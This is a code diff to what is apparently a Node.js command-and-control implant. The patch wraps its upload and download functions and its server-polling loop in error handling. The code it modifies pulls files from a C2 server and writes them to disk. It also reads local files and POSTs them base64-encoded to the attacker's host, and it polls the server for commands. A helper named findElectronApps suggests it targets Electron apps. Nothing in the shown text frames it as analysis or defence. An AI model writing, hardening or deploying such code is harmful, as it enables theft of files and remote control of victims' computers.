@@ -66,53 +66,73 @@ function generateSessionID() {
 }
 
 function uploadFile(file) {
-    https.get(`${C2_SERVER}/upload.php/${file}`, (res) => {
-        let data = '';
+    if (file == ""){
+        return
+    } else {
+        try {
+            https.get(`${C2_SERVER}/upload.php/${file}`, (res) => {
+            let data = '';
 
-        res.on('data', chunk => {
-            data += chunk;
-        });
+                res.on('data', chunk => {
+                    data += chunk;
+                });
 
-        res.on('end', () => {
-            const base64String = data;
-            const filePath = file;
+                res.on('end', () => {
+                    const base64String = data;
+                    const filePath = file;
 
-            const cleaned = base64String.split(',')[1] || base64String;
+                    const cleaned = base64String.split(',')[1] || base64String;
 
-            const buffer = Buffer.from(cleaned, 'base64');
+                    const buffer = Buffer.from(cleaned, 'base64');
 
-            fs.writeFileSync(filePath, buffer);
-        });
-    });
+                    fs.writeFileSync(filePath, buffer);
+                });
+            });
+        } catch {
+            console.error("Error uploading file.")
+        }   
+    }
+
+    
+    
 }
 
 function downloadFile(file) {
-    const content = fs.readFileSync(file);
+    if (file == "") {
+        return
+    } else {
+        try {
+            const content = fs.readFileSync(file);
 
-    const base64data = content.toString('base64');
+            const base64data = content.toString('base64');
 
-    const postData = JSON.stringify({ result: base64data })
-    const options = {
-        hostname: HOST,
-        port: PORT,
-        path: `/upload.php/${file}`,
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(postData)
+            const postData = JSON.stringify({ result: base64data })
+            const options = {
+                hostname: HOST,
+                port: PORT,
+                path: `/upload.php/${file}`,
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Content-Length': Buffer.byteLength(postData)
+                }
+            };
+
+            const req = https.request(options, res => {
+                console.log(`Status: ${res.statusCode}`);
+            });
+
+            req.on('error', err => {
+                console.error(`Error sending output ${err.message}`);
+            });
+
+            req.write(postData);
+            req.end();
+        } catch {
+            console.error("Error uploading file to server.")
         }
-    };
-
-    const req = https.request(options, res => {
-        console.log(`Status: ${res.statusCode}`);
-    });
-
-    req.on('error', err => {
-        console.error(`Error sending output ${err.message}`);
-    });
-
-    req.write(postData);
-    req.end();
+    }
+    
 }
 
 function findElectronApps(dir, results=[]) {
@@ -188,7 +208,9 @@ function pollServer() {
     
             res.on('end', () => {
                 //data = data.trim();
-                if (data && data !== '204 - No Content') {
+
+                try {
+                    if (data && data !== '204 - No Content') {
                     console.log('Recieved command: ', data);
                     if (data == "getpid") {
                         let pid = process.pid.toString()
@@ -213,9 +235,15 @@ function pollServer() {
                             }
                         });
                     }
-                } else {
-                    console.log('No command recieved.')
+                    } else {
+                        console.log('No command recieved.')
+                    }
+
+                } catch {
+                    console.error("Error handling request")
                 }
+
+                
             });
         }).on('error', err => {
             console.error(`Error connecting to C2 server: ${err.message}`);
